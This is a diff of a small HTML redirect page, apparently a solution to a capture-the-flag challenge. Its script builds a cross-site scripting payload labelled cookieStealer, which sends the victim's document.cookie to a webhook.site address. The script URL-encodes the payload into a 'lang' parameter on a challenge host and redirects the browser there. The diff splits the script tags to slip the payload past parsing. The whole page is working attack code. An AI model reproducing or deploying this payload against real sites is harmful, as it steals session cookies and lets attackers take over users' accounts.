@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8">
     <script>
-      const cookieStealer = '<script>fetch(`https://webhook.site/0084921d-f965-4a88-aa8b-bd2c25e26d82?c=${document.cookie}`)</script>';
+      const cookieStealer = '<scr' + 'ipt>fetch("https://webhook.site/0084921d-f965-4a88-aa8b-bd2c25e26d82?c=" + document.cookie)</scr' + 'ipt>';
       const redirectURL = "https://chal1.lagncra.sh:8426/zone?lang=" + encodeURIComponent(cookieStealer);
       window.location.href = redirectURL;
     </script>
@@ -12,3 +12,4 @@
     Redirecting...
   </body>
 </html>
+
